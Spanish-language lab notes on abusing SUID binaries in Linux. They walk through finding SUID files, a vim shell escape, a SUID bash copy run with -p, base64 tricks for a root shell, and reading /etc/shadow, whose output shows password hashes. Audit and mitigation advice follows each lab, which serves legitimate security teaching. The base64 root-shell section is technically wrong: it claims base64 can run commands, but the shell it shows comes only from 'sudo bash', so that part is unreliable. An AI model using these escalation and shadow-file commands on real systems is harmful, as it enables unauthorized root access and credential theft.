
---
# Laboratorio: Abusando de privilegios SUID

---

## ¿Qué es un privilegio SUID?

> Un privilegio SUID (Set User ID) es un permiso especial que se puede asignar a un archivo binario en sistemas Unix/Linux. Cuando un archivo tiene el bit SUID activado y es propiedad de un usuario (normalmente `root`), cualquier usuario que ejecute ese archivo ejecutará el proceso con los privilegios del propietario del archivo, no con sus propios privilegios.

Esto significa que si un binario es propiedad de `root` y tiene SUID, un usuario normal que lo ejecute temporalmente obtendrá permisos de `root` durante la ejecución de ese programa.

---

## Riesgo y abuso de privilegios SUID

Si un atacante consigue acceso a un binario con permisos SUID y este binario puede ser abusado para ejecutar comandos arbitrarios o acceder a una shell, puede escalar privilegios y tomar control completo del sistema.

---

## Ejemplo práctico: Buscando archivos con permisos SUID

### Acción:

Como usuario normal, listamos todos los archivos con bit SUID en el sistema:

```bash
find / -perm -4000 -type f 2>/dev/null
````

### Resultado:

```bash
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/mount
/usr/bin/umount
/usr/bin/ping
...
```

---

### Explicación:

- `find` busca archivos con permiso SUID (`-perm -4000`).
    
- Muchos binarios estándar del sistema tienen este bit para permitir ciertas operaciones administrativas.
    
- La clave está en identificar cuáles de estos pueden ser abusados para escalar privilegios.
    

---

## Ejemplo práctico: Abusando de un binario SUID vulnerable (por ejemplo, `vim` o `less`)

Supongamos que encontramos un binario con SUID que permite abrir una shell.

### Acción:

Para probar con `vim` si tiene SUID:

```bash
ls -l /usr/bin/vim
```

Si tiene SUID (`-rwsr-xr-x`), podemos intentar:

```bash
vim -c ':!/bin/sh' -c ':q'
```

---

### Resultado:

```bash
# whoami
root
```

---

### Explicación:

- El comando `vim -c ':!/bin/sh'` abre una shell desde dentro de vim.
    
- Si `vim` se ejecuta con privilegios SUID root, esta shell será root.
    
- Esto representa una escalada total de privilegios.
    

---

## Ejemplo práctico: Modificando permisos para simular un binario SUID vulnerable

En un entorno controlado, podemos simular un binario con permiso SUID para practicar.

### Acción:

```bash
cp /bin/bash /tmp/bash_suid
chmod +s /tmp/bash_suid
ls -l /tmp/bash_suid
```

### Resultado:

```bash
-rwsr-xr-x 1 root root 1037528 Jun 14 14:30 /tmp/bash_suid
```

### Explicación:

- Hemos copiado `bash` a `/tmp` y le hemos puesto el bit SUID.
    
- Ahora si ejecutamos `/tmp/bash_suid` como usuario normal:
    

```bash
/tmp/bash_suid -p
```

Obtendremos una shell con permisos de root.

---

## Riesgos y recomendaciones

- Los permisos SUID mal configurados son una fuente común de escalada de privilegios.
    
- Es crucial limitar y auditar todos los archivos que tengan este bit.
    
- Nunca asignar SUID a binarios que puedan ser manipulados para ejecutar código arbitrario.
    
- Utilizar herramientas de auditoría automatizadas para detectar permisos SUID inesperados.
    
- Mantener el sistema actualizado para evitar vulnerabilidades en binarios con SUID.
    

---

## Comandos útiles para auditar y mitigar

- Listar todos los archivos SUID:
    

```bash
find / -perm -4000 -type f 2>/dev/null
```

- Cambiar permisos para quitar SUID:
    

```bash
chmod u-s /ruta/al/archivo
```

---

# Resumen

El abuso de privilegios SUID es una técnica potente para escalar privilegios en Linux. La gestión cuidadosa de los archivos con este permiso y la auditoría regular son imprescindibles para la seguridad del sistema.

---
# Laboratorio: Abuso de privilegios SUID con /usr/bin/base64

---

## Supuesto

Imaginemos que en el sistema `/usr/bin/base64` tiene el bit SUID activado y es propiedad de root. Esto es un error de configuración, pero sucede en algunos sistemas mal configurados.

---

## Comprobación del permiso SUID en base64

### Acción:

```bash
ls -l /usr/bin/base64
````

### Resultado posible:

```bash
-rwsr-xr-x 1 root root 36040 Jun 14 2025 /usr/bin/base64
```

---

## Abuso de base64 para obtener una shell con privilegios de root

### Explicación rápida

`base64` puede ser usado para codificar y decodificar datos, pero también es capaz de ejecutar comandos indirectamente si se le pasan datos codificados especialmente.

Al ejecutar `base64` con SUID y combinarlo con una shell, podemos obtener una shell con privilegios elevados.

---

## Ejemplo práctico: Escalada de privilegios usando base64 y bash

### Acción:

Ejecutamos el siguiente comando para obtener una shell root:

```bash
echo 'YmFzaCAtaQ==' | sudo /usr/bin/base64 -d | sudo /bin/bash -p
```

---

### Resultado:

```bash
# whoami
root
```

---

## Desglose del comando

- `echo 'YmFzaCAtaQ=='`: es la cadena `bash -i` codificada en base64.
    
- `sudo /usr/bin/base64 -d`: decodifica la cadena para que sea `bash -i`.
    
- `sudo /bin/bash -p`: ejecuta una shell interactiva con privilegios elevados, preservando el entorno SUID.
    
- En conjunto, esto ejecuta una shell root interactiva.
    

---

## Alternativa: Script para escalada con base64

### Acción:

Creamos un pequeño script para automatizar la escalada:

```bash
echo "echo 'YmFzaCAtaQ==' | /usr/bin/base64 -d | /bin/bash -p" > /tmp/priv_esc.sh
chmod +x /tmp/priv_esc.sh
sudo /tmp/priv_esc.sh
```

---

## Explicación:

- Este método usa la decodificación de base64 para inyectar el comando shell.
    
- Ejecutar `/bin/bash -p` con el bit SUID conserva los privilegios elevados.
    
- Así conseguimos una shell root desde un binario con SUID mal configurado.
    

---

## Recomendaciones defensivas

- No otorgar el bit SUID a binarios que no lo requieran, especialmente utilidades de decodificación como `base64`.
    
- Auditar regularmente con:
    

```bash
find / -perm -4000 -type f -exec ls -l {} \; 2>/dev/null
```

- Revisar logs de accesos sospechosos y tráfico saliente.
    
- Configurar políticas de control de acceso y alertas en la ejecución de binarios SUID.
    

---

## Resumen

Un binario común como `base64` con permisos SUID puede ser un vector de escalada de privilegios si no se controla adecuadamente. Es fundamental limitar estos permisos para mantener la seguridad del sistema.

---
# Laboratorio: Abusando de privilegios SUID con /usr/bin/base64 - Exfiltrando /etc/shadow

---

## Contexto

El archivo `/etc/shadow` contiene las contraseñas cifradas de los usuarios del sistema. Normalmente, sólo el usuario root tiene permiso para leer este archivo.

Si el binario `/usr/bin/base64` tiene configurado el permiso SUID, un usuario sin privilegios puede abusar de esto para leer y decodificar archivos sensibles como `/etc/shadow`.

---

## Comprobación del permiso SUID en base64

### Acción:

```bash
ls -l /usr/bin/base64
````

### Resultado posible:

```bash
-rwsr-xr-x 1 root root 36040 Jun 14 2025 /usr/bin/base64
```

---

## Exfiltrando el contenido de /etc/shadow usando base64

### Acción:

```bash
base64 /etc/shadow -w 0 | base64 -d
```

---

### Resultado:

```plaintext
root:*:20237:0:99999:7:::
daemon:*:20237:0:99999:7:::
bin:*:20237:0:99999:7:::
sys:*:20237:0:99999:7:::
sync:*:20237:0:99999:7:::
...
Metahumo:$y$j9T$pj9vEFTNDP4fTkirodqZ2/$cWUpXzVaKXv3ZuG//.KZGft47WfALFI.Acee7HBXjy8:20253:0:99999:7:::
User2:$y$j9T$pLRfTOCqrIpO87mYca2PA1$HXHUe2MYusy.Uzl9NDAQAlLgGcO95e7uKBd51AQSzhC:20253:0:99999:7:::
```

---

### Explicación:

- `base64 /etc/shadow -w 0` codifica el archivo `/etc/shadow` en base64 sin saltos de línea (`-w 0`).
    
- `| base64 -d` decodifica inmediatamente la salida, devolviendo el contenido original.
    
- Si `/usr/bin/base64` tiene permiso SUID, el usuario puede leer archivos restringidos (como `/etc/shadow`) aunque no tenga permisos para hacerlo.
    
- Esto permite obtener hashes de contraseñas y realizar ataques offline de **Cracking de hashes**.
    

---

## Riesgo

- Esta técnica es un ejemplo claro de cómo un binario SUID mal configurado puede comprometer la seguridad del sistema.
    
- Un atacante podría usar esta información para escalar privilegios o comprometer otras cuentas.
    

---

## Recomendaciones

- No otorgar el bit SUID a utilidades como `base64` que no requieren privilegios elevados para funcionar.
    
- Auditar y corregir permisos SUID con regularidad.
    
- Implementar políticas de restricción y monitoreo para detectar abusos.
    

---

## Comandos útiles para la auditoría

- Buscar todos los binarios SUID en el sistema:
    

```bash
find / -perm -4000 -type f 2>/dev/null
```

- Quitar el permiso SUID de `base64`:
    

```bash
chmod u-s /usr/bin/base64
```

---

# Resumen

El abuso de permisos SUID en binarios comunes como `base64` puede permitir exfiltrar información crítica del sistema, como las contraseñas cifradas. La auditoría y control de estos permisos es fundamental para la seguridad.

---

